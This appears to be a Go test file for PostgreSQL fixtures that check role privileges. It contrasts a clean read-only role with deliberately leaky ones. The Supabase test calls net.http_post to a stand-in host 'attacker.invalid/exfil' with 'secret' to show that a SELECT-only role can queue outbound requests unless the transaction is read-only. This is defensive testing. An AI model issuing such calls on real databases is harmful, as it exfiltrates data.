package testdb

import (
	"errors"
	"slices"
	"testing"

	"github.com/jackc/pgx/v5"
	"github.com/jackc/pgx/v5/pgconn"
)

const (
	sqlStateInsufficientPrivilege = "42501"
	sqlStateReadOnlyTransaction   = "25006"
)

func queryValue[T any](t *testing.T, conn *pgx.Conn, sql string, args ...any) T {
	t.Helper()
	var v T
	if err := conn.QueryRow(t.Context(), sql, args...).Scan(&v); err != nil {
		t.Fatalf("%s: %v", sql, err)
	}
	return v
}

func wantSQLState(t *testing.T, err error, code string) {
	t.Helper()
	var pgErr *pgconn.PgError
	if !errors.As(err, &pgErr) || pgErr.Code != code {
		t.Errorf("error = %v, want SQLSTATE %s", err, code)
	}
}

// inTx runs fn inside a transaction that is always rolled back.
func inTx(t *testing.T, conn *pgx.Conn, opts pgx.TxOptions, fn func(pgx.Tx)) {
	t.Helper()
	tx, err := conn.BeginTx(t.Context(), opts)
	if err != nil {
		t.Fatalf("begin: %v", err)
	}
	defer func() { _ = tx.Rollback(t.Context()) }()
	fn(tx)
}

func TestCleanRoleCanSelectButNotWrite(t *testing.T) {
	conn := Conn(t, RoleClean, DBApp)

	if n := queryValue[int](t, conn, "SELECT count(*) FROM app.customers"); n != 50 {
		t.Errorf("customers = %d, want 50", n)
	}
	if n := queryValue[int](t, conn, "SELECT count(*) FROM app.tenant_notes"); n != 25 {
		t.Errorf("tenant_notes visible through RLS = %d, want 25", n)
	}

	_, err := conn.Exec(t.Context(), "INSERT INTO app.audit_log (message) VALUES ('should fail')")
	wantSQLState(t, err, sqlStateInsufficientPrivilege)

	_, err = conn.Exec(t.Context(), "SELECT dblink_get_connections()")
	wantSQLState(t, err, sqlStateInsufficientPrivilege)

	if queryValue[bool](t, conn, "SELECT pg_has_role(current_user, 'pg_read_server_files', 'MEMBER')") {
		t.Error("ro_clean is a member of pg_read_server_files")
	}
}

func TestLeakyRoleHasItsLeaks(t *testing.T) {
	conn := Conn(t, RoleLeaky, DBApp)

	if n := queryValue[int](t, conn, "SELECT count(*) FROM app.events"); n != 20000 {
		t.Errorf("events = %d, want 20000", n)
	}
	inTx(t, conn, pgx.TxOptions{}, func(tx pgx.Tx) {
		tag, err := tx.Exec(t.Context(), "INSERT INTO app.audit_log (message) VALUES ('leak')")
		if err != nil || tag.RowsAffected() != 1 {
			t.Errorf("INSERT into app.audit_log: tag=%v err=%v, want one row", tag, err)
		}
	})
	if _, err := conn.Exec(t.Context(), "SELECT dblink_get_connections()"); err != nil {
		t.Errorf("EXECUTE on dblink: %v", err)
	}
	if !queryValue[bool](t, conn, "SELECT pg_has_role(current_user, 'pg_read_server_files', 'MEMBER')") {
		t.Error("ro_leaky is not a member of pg_read_server_files")
	}
	if queryValue[bool](t, conn, "SELECT has_table_privilege('app.customers', 'INSERT')") {
		t.Error("ro_leaky can INSERT into app.customers, want only app.audit_log")
	}
}

func TestSupabaseHazardExists(t *testing.T) {
	conn := Conn(t, RoleSupabase, DBSupabase)

	if n := queryValue[int](t, conn, "SELECT count(*) FROM public.profiles"); n != 5 {
		t.Errorf("profiles = %d, want 5", n)
	}
	for _, priv := range []string{"INSERT", "UPDATE", "DELETE"} {
		if !queryValue[bool](t, conn, "SELECT has_table_privilege('net.http_request_queue', $1)", priv) {
			t.Errorf("ro_supabase lacks %s on net.http_request_queue through PUBLIC", priv)
		}
	}

	// A role granted only SELECT queues an HTTP request...
	inTx(t, conn, pgx.TxOptions{}, func(tx pgx.Tx) {
		if _, err := tx.Exec(t.Context(), "SELECT net.http_post('https://attacker.invalid/exfil', 'secret')"); err != nil {
			t.Fatalf("net.http_post: %v", err)
		}
		// DELETE without WHERE needs no SELECT privilege and reports what is queued.
		tag, err := tx.Exec(t.Context(), "DELETE FROM net.http_request_queue")
		if err != nil || tag.RowsAffected() != 1 {
			t.Errorf("queued requests: tag=%v err=%v, want one", tag, err)
		}
	})

	// ...unless the transaction is read-only.
	inTx(t, conn, pgx.TxOptions{AccessMode: pgx.ReadOnly}, func(tx pgx.Tx) {
		_, err := tx.Exec(t.Context(), "SELECT net.http_post('https://attacker.invalid/exfil', 'secret')")
		wantSQLState(t, err, sqlStateReadOnlyTransaction)
	})
}

func TestAppFixtureHasEveryObjectKind(t *testing.T) {
	conn := Conn(t, Superuser, DBApp)

	types := queryValue[[]string](t, conn, `
		SELECT array_agg(DISTINCT t.typname::text)
		FROM pg_attribute a
		JOIN pg_class c ON c.oid = a.attrelid
		JOIN pg_type t ON t.oid = a.atttypid
		WHERE c.relnamespace = 'app'::regnamespace AND c.relkind = 'r' AND a.attnum > 0 AND NOT a.attisdropped`)
	for _, want := range []string{
		"uuid", "numeric", "int8", "text", "bool", "json", "jsonb", "timestamptz",
		"date", "interval", "_int4", "_text", "bytea", "inet", "order_status",
	} {
		if !slices.Contains(types, want) {
			t.Errorf("no app column of type %s (have %v)", want, types)
		}
	}

	checks := map[string]string{
		"primary key":        "SELECT count(*) FROM pg_constraint WHERE conrelid = 'app.customers'::regclass AND contype = 'p'",
		"foreign key":        "SELECT count(*) FROM pg_constraint WHERE conrelid = 'app.orders'::regclass AND contype = 'f'",
		"check constraint":   "SELECT count(*) FROM pg_constraint WHERE conname = 'orders_total_check' AND contype = 'c'",
		"unique index":       "SELECT count(*) FROM pg_index WHERE indexrelid = 'app.customers_email_key'::regclass AND indisunique",
		"partial index":      "SELECT count(*) FROM pg_index WHERE indexrelid = 'app.orders_pending_placed_at_idx'::regclass AND indpred IS NOT NULL",
		"expression index":   "SELECT count(*) FROM pg_index WHERE indexrelid = 'app.customers_lower_name_idx'::regclass AND indexprs IS NOT NULL",
		"view":               "SELECT count(*) FROM pg_class WHERE oid = 'app.customer_order_totals'::regclass AND relkind = 'v'",
		"materialized view":  "SELECT count(*) FROM pg_class WHERE oid = 'app.daily_event_counts'::regclass AND relkind = 'm'",
		"table comment":      "SELECT count(*) FROM pg_description WHERE objoid = 'app.customers'::regclass AND objsubid = 0",
		"column comment":     "SELECT count(*) FROM pg_description WHERE objoid = 'app.customers'::regclass AND objsubid > 0",
		"row level security": "SELECT count(*) FROM pg_class WHERE oid = 'app.tenant_notes'::regclass AND relrowsecurity",
		"policy":             "SELECT count(*) FROM pg_policies WHERE schemaname = 'app' AND tablename = 'tenant_notes'",
		"dblink extension":   "SELECT count(*) FROM pg_extension WHERE extname = 'dblink'",
	}
	for name, sql := range checks {
		if n := queryValue[int](t, conn, sql); n != 1 {
			t.Errorf("%s: found %d, want 1", name, n)
		}
	}

	rows := map[string]int{
		"app.customers": 50, "app.orders": 50, "app.tenant_notes": 50, "app.audit_log": 50, "app.events": 20000,
	}
	for table, want := range rows {
		if n := queryValue[int](t, conn, "SELECT count(*) FROM "+table); n != want {
			t.Errorf("%s has %d rows, want %d", table, n, want)
		}
		if est := queryValue[float32](t, conn, "SELECT reltuples FROM pg_class WHERE oid = $1::regclass", table); est != float32(want) {
			t.Errorf("%s reltuples = %v, want %d: was ANALYZE run?", table, est, want)
		}
	}
}

func TestCreateDatabase(t *testing.T) {
	const name = "scratch_fixture"
	t.Run("create", func(t *testing.T) {
		CreateDatabase(t, name, "CREATE TABLE t (id int); INSERT INTO t VALUES (1), (2);")
		conn := Conn(t, RoleClean, name)
		if n := queryValue[int](t, conn, "SELECT count(*) FROM pg_class WHERE relname = 't'"); n != 1 {
			t.Errorf("fixture table missing")
		}
		_, err := conn.Exec(t.Context(), "SELECT * FROM t")
		wantSQLState(t, err, sqlStateInsufficientPrivilege)
	})

	conn := Conn(t, Superuser, DBApp)
	if queryValue[bool](t, conn, "SELECT EXISTS (SELECT FROM pg_database WHERE datname = $1)", name) {
		t.Errorf("database %s still exists after its test finished", name)
	}

	r := record(func(tb testing.TB) { CreateDatabase(tb, DBApp, "") })
	if !r.failed {
		t.Error("CreateDatabase of an existing database did not fail")
	}
}
